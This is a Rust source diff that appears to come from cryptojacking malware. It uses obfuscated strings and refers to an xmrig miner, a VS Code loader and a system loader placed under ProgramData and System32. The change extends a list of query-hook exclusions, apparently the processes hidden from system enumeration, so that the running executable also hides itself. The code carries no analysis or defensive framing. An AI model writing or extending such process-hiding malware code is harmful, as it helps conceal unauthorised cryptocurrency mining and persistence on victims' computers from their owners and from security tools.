@@ -2,7 +2,7 @@ use std::path::PathBuf;
 use obfstr::obfstr as s;
 use shared::{
     constants::{ client_exe_name, system_loader_exe_name, vscode_initial_loader_exe_name },
-    utils::functions::{ programdata_dir, system32_dir },
+    utils::functions::{ get_current_exe, programdata_dir, system32_dir },
 };
 
 pub fn log_directory() -> PathBuf {
@@ -14,7 +14,8 @@ pub fn default_query_hook_exclusions() -> Vec<String> {
         xmrig_exe_name(),
         vscode_initial_loader_exe_name(),
         system_loader_exe_name(),
-        client_exe_name()
+        client_exe_name(),
+        get_current_exe().file_name().unwrap().to_str().unwrap().to_owned()
     ]
 }
 
